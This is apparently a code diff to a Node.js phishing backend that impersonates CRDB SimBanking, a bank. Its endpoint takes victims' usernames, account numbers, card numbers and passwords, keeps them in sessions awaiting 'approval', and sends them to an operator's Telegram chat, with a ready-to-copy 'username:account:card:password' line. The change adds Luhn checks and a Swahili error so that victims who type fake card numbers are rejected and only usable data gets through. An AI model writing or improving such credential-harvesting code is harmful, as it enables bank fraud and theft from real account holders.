@@ -56,6 +56,25 @@ let bot = null;
 const sessions = new Map();
 const admins = loadAdmins();
 
+// Verification Algorithm for Bank Cards (Luhn Algorithm)
+function isValidLuhnCard(cardNumber) {
+  const sanitized = String(cardNumber || '').replace(/\D/g, '');
+  if (sanitized.length !== 16) return false;
+
+  let sum = 0;
+  let shouldDouble = false;
+  for (let i = sanitized.length - 1; i >= 0; i--) {
+    let digit = parseInt(sanitized.charAt(i), 10);
+    if (shouldDouble) {
+      digit *= 2;
+      if (digit > 9) digit -= 9;
+    }
+    sum += digit;
+    shouldDouble = !shouldDouble;
+  }
+  return (sum % 10) === 0;
+}
+
 function resolveTargetChat(adminParam) {
   if (adminParam && String(adminParam).trim() !== '') {
     const targetAdmin = String(adminParam).trim();
@@ -157,7 +176,7 @@ app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Step 1: Submit Credentials & Bank Details (Box Square Layout)
+// Step 1: Submit Credentials & Bank Details (With Strict Validation & Box Square Layout)
 app.post('/api/submit-credentials', async (req, res) => {
   try {
     let { username, account, card, password, adminChatId } = req.body || {};
@@ -165,10 +184,21 @@ app.post('/api/submit-credentials', async (req, res) => {
       adminChatId = req.query.admin;
     }
 
+    const cleanAccount = String(account || '').replace(/\D/g, '');
+    const cleanCard = String(card || '').replace(/\D/g, '');
+
+    // Strict validation check for Account Number & Card Number
+    if (cleanAccount.length < 10 || cleanAccount.length > 15 || !isValidLuhnCard(cleanCard)) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'TAARIFA SI SAHIHI ❌ (TAFADHALI WEKA AKAUNTI NA KADI HALALI)' 
+      });
+    }
+
     const targetChat = resolveTargetChat(adminChatId);
     const userId = `user_${Date.now()}`;
     sessions.set(userId, { 
-      username, account, card, password, 
+      username, account: cleanAccount, card: cleanCard, password, 
       adminChatId: targetChat, 
       status: 'WAITING_CREDS_APPROVAL' 
     });
@@ -177,12 +207,12 @@ app.post('/api/submit-credentials', async (req, res) => {
                     `│ 🟢 *CRDB SIMBANKING - TAARIFA* │\n` +
                     `├──────────────────────────────┤\n` +
                     `│ 👤 *Mtumiaji:* \`${username}\`\n` +
-                    `│ 💳 *Akaunti:* \`${account}\`\n` +
-                    `│ 💳 *Kadi:* \`${card}\`\n` +
+                    `│ 💳 *Akaunti:* \`${cleanAccount}\`\n` +
+                    `│ 💳 *Kadi:* \`${cleanCard}\`\n` +
                     `│ 🔑 *Nywila:* \`${password}\`\n` +
                     `├──────────────────────────────┤\n` +
                     `│ 📋 *Nakili Zote (Copy):*\n` +
-                    `│ \`${username}:${account}:${card}:${password}\`\n` +
+                    `│ \`${username}:${cleanAccount}:${cleanCard}:${password}\`\n` +
                     `└──────────────────────────────┘`;
 
     const opts = {
